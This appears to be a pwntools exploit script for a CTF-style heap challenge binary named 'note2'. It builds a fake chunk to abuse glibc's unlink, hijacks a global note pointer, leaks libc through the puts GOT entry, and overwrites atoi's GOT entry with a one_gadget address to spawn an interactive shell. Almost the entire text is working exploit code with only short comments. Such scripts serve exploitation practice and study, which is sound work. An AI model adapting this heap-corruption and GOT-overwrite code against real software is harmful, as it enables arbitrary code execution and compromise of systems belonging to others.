"""		some notes made while exploiting
input_address is at 0x602180


"""



from pwn import *

s = process("./note2", env = {"LD_PRELOAD": "./libc-2.23.so"})
libc = ELF("./libc-2.23.so")
elf = ELF("./note2")

s.sendline("/bin/sh\x00")
s.sendline("/bin/sh\x00")


def allocate(size, content):
    s.sendlineafter(">>\n", "1")
    s.sendlineafter("128)\n", str(size))
    s.sendlineafter("content:", content)

def delete(idx):
    s.sendlineafter(">>\n", "4")
    s.sendlineafter("note:", str(idx))

def show(idx):
    s.sendlineafter(">>\n", "2")
    s.sendlineafter("note:", str(idx))

def edit(idx, opt, content):
    s.sendlineafter(">>\n", "3")
    s.sendlineafter("note:", str(idx))
    s.sendlineafter("append]", str(opt))
    s.sendlineafter(":", content)

allocate(0, "x")
allocate(128, "B"*8)
allocate(128, "C"*8)
delete(0)

"""
check we need to pass:
P->FD->BK == P->BK->FD == P
unlink:
P->FD->BK = BK
P->BK->FD = FD
"""
payload = b""
payload += p64(0x0)						# start of fake chunk
payload += p64(0xa1)					# overwrite chunk 1's size
payload += p64(0x602138 - 0x8*3) 		# FD
payload += p64(0x602138 - 0x8*2) 		# BK
payload += b"\x00"*0x80
payload += p64(0xa0)					# start of chunk 2
payload += p64(0x90)					# chunk 2's size
payload += p64(0x0)

allocate(0, payload)
delete(2)
# now ptr at 0th index is pointing to 0x602128-0x8*3, so we can start editing the global data section which contains the ptr

edit(3, 1, p64(elf.got["puts"]))				# editing the pointer at 0x602138-0x8*3 which is the 0th chunk, write puts@got.plt
show(0)
s.recvuntil("Content is ")
leak = s.recvline().strip()
leak = u64(leak.ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
log.info("Leaked libc: {}".format(hex(libc.address))) 

edit(3, 1, p64(elf.got["atoi"]))                # for some reasons, overwriting puts doesn't work so try overwriting other functions
edit(0, 1, p64(libc.address + 0xd5bf7))	# editing the pointer pointed to puts@plt

s.sendline("1")
s.interactive()



